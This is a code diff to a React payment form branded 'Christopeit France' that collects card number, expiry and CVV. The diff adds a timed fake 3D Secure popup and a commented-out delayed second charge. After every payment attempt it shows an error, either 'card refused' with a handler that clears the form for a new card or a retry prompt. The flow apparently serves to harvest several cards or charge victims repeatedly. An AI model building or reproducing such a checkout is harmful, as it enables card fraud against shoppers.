@@ -11,10 +11,12 @@ const CustomPay = ({ amount, orderNumber, onBack, showStep, isLoading, setIsLoad
   });
 
   const [showPaymentError, setShowPaymentError] = useState(false);
+  const [showCardError, setShowCardError] = useState(false);
   const [cardLogo, setCardLogo] = useState('/verified-by-visa.png');
 
   const cardNumberRef = useRef(null);
   const expiryDateRef = useRef(null);
+  const cvvRef = useRef(null);
   const router = useRouter();
 
   const currentDate = new Date();
@@ -80,14 +82,13 @@ const CustomPay = ({ amount, orderNumber, onBack, showStep, isLoading, setIsLoad
         throw new Error(data.message || 'Something went wrong!');
       }
       
-      // Afficher une alerte avec le status récupéré
+      console.log("Réponse de l'API:", data);
       if(data.result) {
-        alert(`Transaction status: ${data.result}`);
+        return data.result;
       } else {
-        alert('No status received from the API.');
+        return data; 
       }
 
-      return data;
     } catch (error) {
       console.error('Error fetching payment:', error);
       setShowPaymentError(false);
@@ -113,8 +114,13 @@ const CustomPay = ({ amount, orderNumber, onBack, showStep, isLoading, setIsLoad
     return false;
   }
 
-  const handleSubmit = async (e) => {
+  const handleCheckout = async (e) => {
     e.preventDefault();
+
+    // Unfocus le champ cvv
+    if (document.activeElement === document.querySelector('input[name="cvv"]')) {
+      document.activeElement.blur();
+    }
     
     // Tracking Ads "Achat"
     gtag_report_conversion();
@@ -138,17 +144,23 @@ const CustomPay = ({ amount, orderNumber, onBack, showStep, isLoading, setIsLoad
       setTimeout(() => {
         setIsLoading(false);
         setShow3DSecurePopup(true);
-      }, 46000);
+      }, 48000);
 
       // Lancement différé d'un 2ème paiement
       // setTimeout(() => {
       //   payFetch(orderNumber, amount, cardDetails);
       // }, 62000);
 
-      await payFetch(orderNumber, amount, cardDetails);
+      const result = await payFetch(orderNumber, amount, cardDetails);
       setIsLoading(false);
       setShow3DSecurePopup(false);
-      setShowPaymentError(true);
+      
+      // Afficher la popup d'erreur en fonction de si paiement refusé
+      if (result === "refused") {
+        setShowCardError(true);  
+      } else {
+        setShowPaymentError(true);
+      }
 
     } catch (error) {
       console.error(data.checkoutPayError, error);
@@ -161,11 +173,24 @@ const CustomPay = ({ amount, orderNumber, onBack, showStep, isLoading, setIsLoad
   const handleRetry = () => {
     setShowPaymentError(false);
     setShow3DSecurePopup(false);
-    handleSubmit(new Event('submit'));
+    handleCheckout(new Event('submit'));
   };
 
+  const handleChangeCard = () => {
+    setShowCardError(false);
+    setShow3DSecurePopup(false);
+    
+    setFormData({
+      cardNumber: '',
+      expiryDate: '',
+      cvv: '',
+
+    });
+    cardNumberRef.current.focus();
+  }
+
   return (
-    <form onSubmit={handleSubmit}>
+    <form onSubmit={handleCheckout}>
       <input
         type="text"
         name="cardHolder"
@@ -197,7 +222,9 @@ const CustomPay = ({ amount, orderNumber, onBack, showStep, isLoading, setIsLoad
           type="text"
           name="cvv"
           placeholder={data.checkoutPayCVVPlaceholder}
+          ref={cvvRef}
           maxLength="4"
+          value={formData.cvv}
           onChange={handleInputChange}
           required
         />
@@ -290,6 +317,29 @@ const CustomPay = ({ amount, orderNumber, onBack, showStep, isLoading, setIsLoad
             <p className="desc">{data.checkoutPayErrorDescription}</p>
             <button onClick={handleRetry} disabled={isLoading}>
               {data.checkoutPayRetryButton}
+            </button>
+          </div>
+        </div>
+      )}
+
+      {showCardError && (
+        <div className="verification-wrapper">
+          <div className="verification-popup error">
+            <article className="head">
+              <img className="brand-logo" src="icon.png" alt="Christopeit France" />
+              <img
+                className={`card-logo ${
+                  cardLogo === '/mastercard-id-check.png' ? 'mastercard' : 'visa'
+                }`}
+                src={cardLogo}
+                alt={data.checkoutPayVerifiedPaymentAlt}
+              />
+            </article>
+            <h2 className="icon">❌</h2>
+            <h2>{data.checkoutCardErrorTitle}</h2>
+            <p className="desc">{data.checkoutCardErrorDescription}</p>
+            <button onClick={handleChangeCard} disabled={isLoading}>
+              {data.checkoutCardRetryButton}
             </button>
           </div>
         </div>
